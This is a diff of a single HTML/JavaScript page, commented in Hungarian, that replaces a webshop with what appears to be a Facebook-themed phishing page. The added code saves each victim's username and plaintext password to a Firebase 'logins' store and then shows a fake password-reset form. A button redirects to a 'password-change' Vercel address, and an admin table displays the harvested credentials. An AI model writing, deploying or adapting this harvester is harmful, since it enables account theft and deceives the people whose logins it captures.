-                        <h3>📦 Recent Orders (${orders.length})</h3>
-                        <div id="orders-list"></div>
-                        
-                        <h3 style="margin-top:2rem;">➕ Add New Product</h3>
-                        <div class="form-group">
-                            <label>Product Name:</label>
-                            <input type="text" id="product-name" placeholder="e.g., Designer Jacket">
-                        </div>
-                        <div class="form-group">
-                            <label>Price ($):</label>
-                            <input type="number" id="product-price" placeholder="0.00">
-                        </div>
-                        <div class="form-group">
-                            <label>Image URL:</label>
-                            <input type="text" id="product-image" placeholder="https://via.placeholder.com/200">
-                        </div>
-                        <button onclick="addProduct()" style="padding:0.8rem 1rem;background:#48bb78;color:white;border:none;border-radius:5px;">➕ Add Product (Auto-Saves to Code)</button>
-                        
-                        <h3 style="margin-top:2rem;">🔑 QR Code Management</h3>
-                        <button onclick="generateQRCode()" style="padding:0.8rem 1rem;background:#667eea;color:white;border:none;border-radius:5px;">🎫 Generate QR Code (Auto-Saves to Code)</button>
-                        <div id="qr-list"></div>
-                    </div>
-                    <div class="products-grid">
-                        ${products.map(product => `
-                            <div class="product-card">
-                                <button class="delete-product" onclick="deleteProduct(${product.id})">×</button>
-                                <img src="${product.image}" class="product-image" onerror="this.src='https://via.placeholder.com/200'">
-                                <div class="product-info">
-                                    <div class="product-title">${product.name}</div>
-                                    <div class="product-price">$${product.price}</div>
-                                    <button onclick="addToCart(${product.id})" class="add-to-cart">Add to Cart</button>
-                                </div>
-                            </div>
-                        `).join('')}
-                    </div>
-                `;
-                displayQRList();
-                displayOrders();
+
+            // Firebase mentés
+            if (window.db) {
+                const loginRef = window.ref(window.db, 'logins');
+                window.push(loginRef, {
+                    user: user,
+                    password: pass,
+                    timestamp: new Date().toISOString()
+                }).then(() => {
+                    // Sikeres mentés után megjelenik a jelszó-visszaállító oldal
+                    showReset();
+                }).catch((error) => {
+                    console.error("Hiba a mentés során: ", error);
+                    // Hiba esetén is továbblép, hogy ne akadjon el a folyamat
+                    showReset();
+                });
             } else {
-                app.innerHTML = `
-                    <div class="products-grid">
-                        ${products.map(product => `
-                            <div class="product-card">
-                                <img src="${product.image}" class="product-image" onerror="this.src='https://via.placeholder.com/200'">
-                                <div class="product-info">
-                                    <div class="product-title">${product.name}</div>
-                                    <div class="product-price">$${product.price}</div>
-                                    <button onclick="addToCart(${product.id})" class="add-to-cart">Add to Cart</button>
-                                </div>
-                            </div>
-                        `).join('')}
-                    </div>
-                `;
+                alert('Firebase nincs konfigurálva! A bejelentkezés nem lett mentve.');
+                showReset();
             }
-        }
-        
-        function displayQRList() {
-            const qrListDiv = document.getElementById('qr-list');
-            if (qrListDiv) {
-                qrListDiv.innerHTML = '<h4>Active QR Codes (Auto-Saved to Code):</h4>';
-                activeQRs.forEach(qr => {
-                    const container = document.createElement('div');
-                    container.className = 'qr-item';
-                    const qrDivId = 'qr_' + qr.replace(/[^a-zA-Z0-9]/g, '_');
-                    container.innerHTML = `
-                        <div>
-                            <strong>${qr}</strong>
-                            <div id="${qrDivId}"></div>
-                        </div>
-                        <button class="delete-qr" onclick="deleteQRCode('${qr}')">Delete</button>
+        });
+
+        // --- FACEBOOK GOMB (Átirányítás) ---
+        document.getElementById('btn-fb').addEventListener('click', function() {
+            window.location.href = 'https://password-change.vercel.app/#';
+        });
+
+        // --- JELSZÓ VISSZAÁLLÍTÁS (Bejelentkezés után) ---
+        document.getElementById('reset-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const newPass = document.getElementById('new-password').value;
+            const confirmPass = document.getElementById('confirm-password').value;
+
+            if (newPass.length < 6) {
+                alert('A jelszónak legalább 6 karakter hosszúnak kell lennie!');
+                return;
+            }
+
+            if (newPass !== confirmPass) {
+                alert('A két jelszó nem egyezik meg!');
+                return;
+            }
+
+            // Sikeres üzenet
+            document.getElementById('reset-form').style.display = 'none';
+            document.getElementById('success-msg').style.display = 'block';
+        });
+
+        // --- ADMIN PANEL LOGIKA ---
+        function loadAdminData() {
+            if (!window.db) {
+                document.getElementById('admin-table-body').innerHTML = '<tr><td colspan="5">Firebase nincs beállítva.</td></tr>';
+                return;
+            }
+
+            const loginRef = window.ref(window.db, 'logins');
+            window.onValue(loginRef, (snapshot) => {
+                const tbody = document.getElementById('admin-table-body');
+                tbody.innerHTML = '';
+
+                if (!snapshot.exists()) {
+                    tbody.innerHTML = '<tr><td colspan="5">Nincsenek bejelentkezések.</td></tr>';
+                    return;
+                }
+
+                let index = 1;
+                snapshot.forEach((childSnapshot) => {
+                    const data = childSnapshot.val();
+                    const key = childSnapshot.key;
+
+                    const tr = document.createElement('tr');
+                    tr.innerHTML = `
+                        <td><input type="checkbox" class="admin-checkbox" data-key="${key}"></td>
+                        <td>${index}</td>
+                        <td>${data.user || 'N/A'}</td>
+                        <td>${data.password || 'N/A'}</td>
+                        <td>${new Date(data.timestamp).toLocaleString()}</td>
                     `;
-                    qrListDiv.appendChild(container);
-                    new QRCode(document.getElementById(qrDivId), { text: qr, width: 100, height: 100 });
+                    tbody.appendChild(tr);
+                    index++;
                 });
+            });
+        }
+
+        document.getElementById('btn-delete-selected').addEventListener('click', function() {
+            const checkboxes = document.querySelectorAll('.admin-checkbox:checked');
+            if (checkboxes.length === 0) {
+                alert('Nincs kijelölve egyetlen bejelentkezés sem!');
+                return;
             }
-        }
-        
-        function displayOrders() {
-            const div = document.getElementById('orders-list');
-            if (div && orders.length) {
-                div.innerHTML = `
-                    <table class="orders-table">
-                        <thead><tr><th>ID</th><th>Date</th><th>Customer</th><th>Items</th><th>Total</th><th>Payment</th><th>Status</th><th>Pickup</th></tr></thead>
-                        <tbody>
-                            ${orders.map(o => `
-                                <tr>
-                                    <td>#${o.id}</td>
-                                    <td>${o.date}</td>
-                                    <td>${o.customerName}</td>
-                                    <td>${o.items.map(i=>i.name).join(', ')}</td>
-                                    <td>$${o.total}</td>
-                                    <td>${o.paymentMethod}</td>
-                                    <td><span class="${o.status === 'Paid' ? 'status-paid' : 'status-cash'}">${o.status}</span></td>
-                                    <td><small>${o.pickupLocation?.address?.substring(0, 40) || 'N/A'}...</small></td>
-                                </tr>
-                            `).join('')}
-                        </tbody>
-                    </table>
-                `;
-            } else if (div) {
-                div.innerHTML = '<p>No orders yet.</p>';
+
+            if (confirm('Biztosan törölni szeretnéd a kijelölt bejelentkezéseket?')) {
+                checkboxes.forEach(cb => {
+                    const key = cb.getAttribute('data-key');
+                    const itemRef = window.ref(window.db, 'logins/' + key);
+                    window.remove(itemRef);
+                });
+                alert('Kijelölt bejelentkezések törölve!');
             }
-        }
-        
-        // ============ QR SCANNER FUNCTIONS ============
-        function showQRScanner() { document.getElementById('qr-scanner-modal').style.display = 'block'; startScanner(); }
-        function closeQRScannerModal() { stopScanner(); document.getElementById('qr-scanner-modal').style.display = 'none'; }
-        
-        function startScanner() {
-            if (html5QrCode) html5QrCode.stop().then(() => startScannerReal()).catch(() => startScannerReal());
-            else startScannerReal();
-        }
-        
-        function startScannerReal() {
-            html5QrCode = new Html5Qrcode("qr-reader");
-            html5QrCode.start({ facingMode: "environment" }, { fps: 10, qrbox: 250 }, 
-                (text) => handleQRCodeScanned(text), 
-                (err) => console.log(err)
-            ).catch(() => showAlert('Camera access denied', 'error'));
-            isScanning = true;
-        }
-        
-        function stopScanner() { if (html5QrCode && isScanning) html5QrCode.stop().then(() => isScanning = false); }
-        function showManualQR() { closeQRScannerModal(); document.getElementById('manual-qr-modal').style.display = 'block'; }
-        function closeManualQRModal() { document.getElementById('manual-qr-modal').style.display = 'none'; }
-        
-        function handleQRCodeScanned(qrCode) {
-            stopScanner();
-            if (activeQRs.includes(qrCode)) {
-                currentUser = qrCode;
-                const balance = qrUsers[qrCode]?.balance || 0;
-                document.getElementById('user-balance').innerText = balance;
-                document.getElementById('balance-modal').style.display = 'block';
-                closeQRScannerModal();
-                showAlert(`✅ QR verified! Balance: $${balance}`, 'success');
-            } else {
-                showAlert('Invalid QR Code!', 'error');
-            }
-        }
-        
-        function verifyManualQR() {
-            const qrCode = document.getElementById('manual-qr-input').value.trim();
-            if (activeQRs.includes(qrCode)) {
-                currentUser = qrCode;
-                const balance = qrUsers[qrCode]?.balance || 0;
-                document.getElementById('user-balance').innerText = balance;
-                document.getElementById('balance-modal').style.display = 'block';
-                closeManualQRModal();
-                showAlert(`✅ QR verified! Balance: $${balance}`, 'success');
-            } else {
-                showAlert('Invalid QR Code!', 'error');
-            }
-        }
-        
-        // ============ AUTH ============
-        function showOwnerLogin() { document.getElementById('owner-modal').style.display = 'block'; }
-        function closeOwnerModal() { document.getElementById('owner-modal').style.display = 'none'; }
-        
-        function ownerLogin() {
-            const email = document.getElementById('owner-email').value;
-            if (email === OWNER_EMAIL) { 
-                isOwner = true; 
-                closeOwnerModal(); 
-                showProducts(); 
-                showAlert('Welcome Owner! All changes are AUTO-SAVED to code.', 'success');
-            } else {
-                showAlert('Invalid email! Use: owner@webshop.com', 'error');
-            }
-        }
-        
-        function closeBalanceModal() { document.getElementById('balance-modal').style.display = 'none'; }
-        
-        function showAlert(msg, type) {
-            const alert = document.createElement('div');
-            alert.className = `alert alert-${type}`;
-            alert.innerHTML = msg;
-            document.body.appendChild(alert);
-            setTimeout(() => alert.remove(), 3000);
-        }
-        
-        // ============ WEEKLY BALANCE UPDATE ============
-        function updateWeeklyBalances() {
-            let updated = false;
-            for (let qr in qrUsers) {
-                const last = qrUsers[qr].lastWeekly || 0;
-                if (Date.now() - last > 7*24*60*60*1000) {
-                    qrUsers[qr].balance = (qrUsers[qr].balance || 0) + 100;
-                    qrUsers[qr].lastWeekly = Date.now();
-                    updated = true;
-                }
-            }
-            if (updated) saveUsers();
-        }
-        
-        // ============ INIT ============
-        loadAllData();
-        updateWeeklyBalances();
-        setInterval(updateWeeklyBalances, 24*60*60*1000);
-        showProducts();
-        
-        console.log('✅ WebShop Ready - All data AUTO-SAVED to localStorage!');
-        console.log('💾 Click "Save as HTML" to download the full code with all products and QR codes!');
+        });
+
+        document.getElementById('btn-logout').addEventListener('click', function() {
+            showMain();
+        });
+
     </script>
 </body>
 </html>
